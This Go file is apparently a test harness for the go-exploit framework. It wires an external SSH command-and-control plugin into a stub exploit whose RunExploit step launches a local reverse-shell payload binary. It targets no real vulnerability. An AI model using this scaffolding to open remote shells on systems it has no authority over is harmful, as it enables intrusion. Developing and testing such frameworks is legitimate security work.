package main

import (
	"os/exec"

	"github.com/vulncheck-oss/go-exploit"
	"github.com/vulncheck-oss/go-exploit/c2"
	"github.com/vulncheck-oss/go-exploit/c2/external"
	"github.com/vulncheck-oss/go-exploit/config"
	"github.com/vulncheck-oss/go-exploit/output"

	c2ssh "github.com/terrorbyte/external-c2-ssh"
)

type ExternalSSHTest struct{}

func (sploit ExternalSSHTest) ValidateTarget(_ *config.Config) bool {
	return false
}

func (sploit ExternalSSHTest) CheckVersion(_ *config.Config) exploit.VersionCheckType {
	return exploit.NotImplemented
}

func (sploit ExternalSSHTest) RunExploit(conf *config.Config) bool {
	cmd := exec.Command("./payload/reverse_shell/reverse_shell")
	if err := cmd.Run(); err != nil {
		output.PrintfError("%s", err.Error())
	}

	return true
}

func main() {
	supportedC2 := []c2.Impl{
		c2.External,
	}
	ext := external.GetInstance()
	c2ssh.Configure(ext)
	conf := config.New(config.CodeExecution, supportedC2, "Payload Test", "N/A", 80)
	sploit := ExternalSSHTest{}
	exploit.RunProgram(sploit, conf)
}
